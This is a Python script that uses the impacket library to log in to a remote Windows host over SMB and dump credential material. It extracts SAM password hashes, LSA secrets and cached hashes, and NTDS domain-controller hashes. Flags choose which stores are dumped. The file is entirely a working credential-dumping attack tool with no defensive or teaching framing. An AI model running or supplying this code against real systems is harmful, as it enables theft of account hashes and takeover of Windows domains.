#!/usr/bin/env python

from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes

class DumpSecrets:
    def __init__(self, remoteHost, username, password, domain, options=None):
        self.__remoteHost = remoteHost
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__smbConnection = None
        self.__remoteOps = None
        self.__isRemote = True
        self.__doKerberos = False
        self.__justSAM = options.just_sam
        self.__justLSA = options.just_lsa
        self.__justDC = options.just_dc
        self.__justDCNTLM = options.just_dc_ntlm
        self.__options = options

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteHost, self.__remoteHost)
        self.__smbConnection.login(self.__username, self.__password, self.__domain)

    def dump(self):
        self.connect()
        self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos)
        self.__remoteOps.enableRegistry()
        bootKey = self.__remoteOps.getBootKey()

        # If RemoteOperations succeeded, then we can extract SAM and LSA
        if self.__justLSA == True or self.__justDC == True:
            pass
        else:
            try:
                SAMFileName = self.__remoteOps.saveSAM()
                SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote).dump()
            except Exception as e:
                print(f'SAM hashes extraction failed: {e}')

        if self.__justSAM == True or self.__justDC == True:
            pass
        else:
            try:
                SECURITYFileName = self.__remoteOps.saveSECURITY()
                _LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote)
                _LSASecrets.dumpCachedHashes()
                _LSASecrets.dumpSecrets()
            except Exception as e:
                print(f'LSA hashes extraction failed: {e}')

        # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
        if self.__justSAM == True or self.__justLSA == True:
            pass
        else:
            NTDSFileName = None
            NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, remoteOps=self.__remoteOps, justNTLM=self.__justDCNTLM).dump()

class Options:
    def __init__(self):
        self.just_sam = False
        self.just_lsa = False
        self.just_dc = False
        self.just_dc_ntlm = False